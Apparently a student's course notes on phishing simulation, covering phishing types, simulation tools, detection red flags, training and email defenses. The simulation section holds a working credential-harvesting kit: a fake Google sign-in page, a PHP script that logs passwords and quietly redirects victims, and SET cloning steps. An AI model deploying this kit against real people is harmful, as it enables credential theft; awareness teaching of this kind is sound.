# Phishing Simulation & Awareness Notes — Task 4

## What is Phishing?
Phishing is a social engineering attack where an attacker impersonates a trusted entity (bank, IT department, service provider) to trick victims into revealing credentials, clicking malicious links, or downloading malware.

---

## 1. Types of Phishing

| Type | Description |
|------|-------------|
| **Email Phishing** | Mass emails impersonating trusted brands |
| **Spear Phishing** | Targeted attack on specific individual |
| **Whaling** | Targeted at executives (CEO, CFO) |
| **Smishing** | Phishing via SMS |
| **Vishing** | Phishing via voice/phone calls |
| **Clone Phishing** | Copy of legitimate email with malicious link |
| **Pharming** | DNS poisoning to redirect to fake site |

---

## 2. Creating a Phishing Simulation Page

### Purpose
Phishing simulations are used by security teams to test employee awareness. They are NOT for malicious use.

### Method 1 — Using SET (Social Engineering Toolkit)

```bash
sudo setoolkit

# Menu navigation:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# Enter your IP (attacker/listener IP)
# Enter URL to clone: https://accounts.google.com

# SET clones the page and captures credentials at http://YOUR_IP/
```

### Method 2 — Manual HTML Phishing Page

Create a convincing login page that submits credentials to attacker:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Gmail - Sign In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f1f1f1; }
        .container { width: 350px; margin: 80px auto; background: white; 
                     padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
        h2 { color: #202124; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; 
                border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; 
                 border: none; border-radius: 4px; cursor: pointer; font-size: 14px; }
        .logo { text-align: center; font-size: 24px; color: #4285f4; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Google</div>
        <h2>Sign in</h2>
        <!-- NOTE: This form posts to a credential harvester script -->
        <form method="POST" action="capture.php">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
```

**Credential capture script (capture.php):**
```php
<?php
// Log credentials to file
$email    = $_POST['email'];
$password = $_POST['password'];
$ip       = $_SERVER['REMOTE_ADDR'];
$time     = date('Y-m-d H:i:s');

file_put_contents('captured.txt', 
    "Time: $time | IP: $ip | Email: $email | Pass: $password\n", 
    FILE_APPEND);

// Redirect victim to real site to avoid suspicion
header('Location: https://accounts.google.com');
exit();
?>
```

**Host it:**
```bash
sudo python3 -m http.server 80
# OR
sudo php -S 0.0.0.0:80
```

### Method 3 — GoPhish (Professional Phishing Framework)

```bash
# Download GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish*.zip
chmod +x gophish
sudo ./gophish

# Access admin panel at https://localhost:3333
# Default: admin / gophish (change immediately)
```

GoPhish features:
- Email template creation
- Landing page cloning
- Campaign tracking (who opened, who clicked, who submitted)
- Detailed reports with statistics

---

## 3. Phishing Indicators — How to Detect

### Email Red Flags
```
Sender domain:
  REAL:  support@amazon.com
  FAKE:  support@amaz0n.com
         support@amazon-security.net
         support@amazon.com.phishing.net

Urgency language:
  "Your account will be suspended in 24 hours"
  "Immediate action required"
  "Verify your account NOW"

Generic greeting:
  "Dear Customer" instead of your actual name

Suspicious links:
  Hover over links — URL doesn't match display text
  http://192.168.1.1/paypal/login
  https://paypal.com.scammer.ru/login

Attachments:
  Unexpected invoice.pdf
  Resume.docx with macros
  Order_confirmation.exe
```

### Website Red Flags
```
URL inspection:
  No HTTPS padlock
  Wrong domain: paypa1.com, g00gle.com
  Subdomain tricks: paypal.com.evil.com (evil.com is the real domain)
  Extra path: real-site.com/verify/paypal.com

Visual indicators:
  Slightly different logo/colors
  Low quality images
  Missing navigation elements
  Form submits to different domain
```

---

## 4. Phishing Awareness Training

### Key Training Points for Employees

1. **Verify the sender** — Check the actual email address, not just the display name
2. **Hover before clicking** — Check URLs before clicking any link
3. **When in doubt, don't** — Navigate directly to the site, don't use email links
4. **Check for HTTPS** — But note: HTTPS doesn't mean safe, only encrypted
5. **Never enter credentials** from an emailed link — Go directly to the website
6. **Report suspicious emails** — Forward to IT security team
7. **Multi-Factor Authentication** — Even if credentials are stolen, MFA blocks access

### Phishing Simulation Program Steps
```
1. Baseline campaign — test employees with no prior training
2. Deliver security awareness training
3. Follow-up simulation — measure improvement
4. Track click rates, credential submission rates
5. Provide immediate feedback to employees who fall for it
6. Repeat quarterly
```

### Common Pretexts Used in Simulations
- IT password reset request
- HR benefits enrollment deadline
- Package delivery notification
- CEO request for urgent wire transfer
- Cloud storage file share notification

---

## 5. Technical Defenses Against Phishing

| Defense | Description |
|---------|-------------|
| **SPF** | DNS record listing authorized mail servers |
| **DKIM** | Cryptographic signature on outgoing email |
| **DMARC** | Policy for handling SPF/DKIM failures |
| **Email filtering** | Scan attachments, block known phishing domains |
| **MFA** | Stops credential theft even if phishing succeeds |
| **DNS filtering** | Block known malicious domains at DNS level |
| **Browser warnings** | Google Safe Browsing flags phishing pages |
| **Password managers** | Won't autofill on wrong domains |

---

## Key Takeaways
- Phishing is the most common initial attack vector in real breaches
- SET and GoPhish make simulations easy to set up and measure
- Human awareness is the most effective defense
- MFA is the single most impactful technical control against phishing
- DMARC + DKIM + SPF protect your domain from being spoofed
- Simulations should be regular, not one-time events
